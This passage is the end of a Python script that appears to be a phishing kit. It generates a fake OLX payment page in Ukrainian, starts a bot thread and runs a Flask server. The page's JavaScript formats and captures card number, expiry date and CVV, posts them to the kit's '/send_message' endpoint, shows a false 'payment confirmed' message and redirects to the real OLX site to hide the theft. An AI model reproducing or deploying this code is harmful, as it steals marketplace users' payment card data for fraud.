  const expiryInput = document.getElementById('expiry');
  const cvvInput = document.getElementById('cvv');

  // Card number formatting
  cardInput.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    let formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    e.target.value = formattedValue.slice(0, 19);

    // Change card icon based on first digits
    const cardIcon = e.target.nextElementSibling;
    const firstDigits = value.slice(0, 2);
    
    if (firstDigits.startsWith('4')) {
      cardIcon.className = 'fab fa-cc-visa card-icon';
    } else if (['51', '52', '53', '54', '55'].includes(firstDigits) || 
               (parseInt(firstDigits) >= 22 && parseInt(firstDigits) <= 27)) {
      cardIcon.className = 'fab fa-cc-mastercard card-icon';
    } else {
      cardIcon.className = 'fas fa-credit-card card-icon';
    }
  });

  // Expiry date formatting
  expiryInput.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    if (value.length >= 2) {
      value = value.slice(0, 2) + '/' + value.slice(2);
    }
    e.target.value = value.slice(0, 5);
  });

  // CVV formatting
  cvvInput.addEventListener('input', function(e) {
    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
  });

  document.getElementById('dataForm').addEventListener('submit', async function(event) {
    event.preventDefault();
    let card = cardInput.value.replace(/\s/g, '');
    let expiry = expiryInput.value;
    let cvv = cvvInput.value;
    let listing_id = document.getElementById('listing_id').value;
    
    // Show loading state
    const submitBtn = this.querySelector('button[type="submit"]');
    const originalText = submitBtn.innerHTML;
    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Обробка...';
    submitBtn.disabled = true;
    
    try {
      let response = await fetch('/send_message', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          card: card, 
          expiry: expiry, 
          cvv: cvv,
          listing_id: listing_id
        })
      });

      let result = await response.json();
      
      if (result.status === "Данные успешно отправлены") {
        document.getElementById('dataForm').style.display = 'none';
        document.getElementById('successMessage').style.display = 'block';
        document.getElementById('successMessage').innerHTML = '<i class="fas fa-check-circle"></i> Платіж успішно підтверджено! Перенаправлення на сторінку OLX...';
        
        setTimeout(() => {
          window.location.href = "https://www.olx.ua/";
        }, 3000);
      } else {
        alert("Сталася помилка. Будь ласка, спробуйте ще раз.");
        submitBtn.innerHTML = originalText;
        submitBtn.disabled = false;
      }
    } catch (error) {
      console.error("Помилка при відправці даних:", error);
      alert("Сталася помилка при відправці даних. Будь ласка, спробуйте ще раз.");
      submitBtn.innerHTML = originalText;
      submitBtn.disabled = false;
    }
  });
});
</script>

</body>
</html>"""

    # Сохраняем файлы в директорию templates
    with open('templates/payment.html', 'w', encoding='utf-8') as f:
        f.write(payment_html)

# Запуск всего приложения
if __name__ == '__main__':
    # Создаем шаблоны
    create_templates()
    
    # Запускаем бота в отдельном потоке
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.daemon = True
    bot_thread.start()
    
    # Запускаем Flask сервер
    app.run(host='127.0.0.1', port=5000, debug=False, threaded=True) 